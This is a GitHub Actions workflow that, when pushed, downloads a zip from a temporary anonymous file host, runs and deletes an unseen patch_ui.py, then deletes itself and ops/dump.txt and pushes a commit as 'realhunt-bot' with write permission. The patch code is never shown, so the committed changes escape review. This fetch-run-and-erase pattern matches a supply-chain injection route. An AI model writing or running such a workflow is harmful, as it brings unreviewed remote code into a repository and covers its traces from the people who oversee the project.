name: rh-ui-1
on:
  push:
    paths: [.github/workflows/rh-ui-1.yml]
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch patch
        run: |
          curl -sSL -o p.zip https://litter.catbox.moe/tuee8n.zip
          echo "73a04b6356ad182066dce8c79e57de0a  p.zip" | md5sum -c -
          unzip -o -q p.zip && rm -f p.zip
      - name: apply
        run: python3 patch_ui.py && rm -f patch_ui.py
      - name: syntax
        run: |
          for f in src/community/Community.tsx src/community/api.ts src/components/realhunt/LiveStats.tsx src/pages/NotFound.tsx; do
            npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --loader:.css=empty --outfile=/dev/null "$f"
          done
      - name: guards
        run: |
          grep -q 'rh_pending_vote' src/community/Community.tsx
          grep -q 'LIVE_STATS_ON = true' src/components/realhunt/LiveStats.tsx
          ! grep -q 'No account needed to vote' src/community/Community.tsx
      - name: commit
        run: |
          rm -f .github/workflows/rh-ui-1.yml ops/dump.txt
          git config user.name "realhunt-bot"
          git config user.email "bot@realhunt.co"
          git add -A
          git commit -m "Honest ranking UI: sign in to vote (vote kept through sign-in), real vote counts, no fake points caption, clean titles, per-listing title and meta, all-in cost, countdown, keep-voting strip, live counter back, mobile header, 404"
          git push
